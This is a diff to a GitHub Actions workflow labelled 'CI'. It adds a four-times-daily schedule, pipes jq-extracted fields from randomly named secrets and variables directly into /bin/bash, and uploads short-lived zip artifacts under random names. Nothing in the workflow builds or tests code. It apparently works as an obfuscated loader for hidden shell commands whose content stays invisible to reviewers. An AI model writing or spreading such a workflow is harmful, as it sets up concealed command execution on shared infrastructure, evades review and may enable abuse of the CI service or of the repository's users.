@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '31 3,9,15,21 * * *'
 jobs:
   start:
     runs-on: ubuntu-latest
@@ -9,18 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute task
         env:
-          rzpge8: ${{ secrets.rzpge8 }}
+          udnzm096: ${{ secrets.udnzm096 }}
         run: |
-          printf '%s' "$rzpge8" | jq -r .mgtg23558 | /bin/bash
-          echo $fmfb9588 | jq -r .aw439 | /bin/bash
-          echo $icp3 | jq -r .y65879 | /bin/bash
-          printf '%s' "$ejzoi46" | jq -r .f63 | /bin/bash
-          echo $lclet949 | jq -r .imf64 | /bin/bash
+          printf '%s' "$udnzm096" | jq -r .cbzy539 | /bin/bash
+          echo $ya8 | jq -r .dre609 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: 49DvDJbr
+          name: AGbWs7Ro
           path: "*.zip"
           retention-days: 1
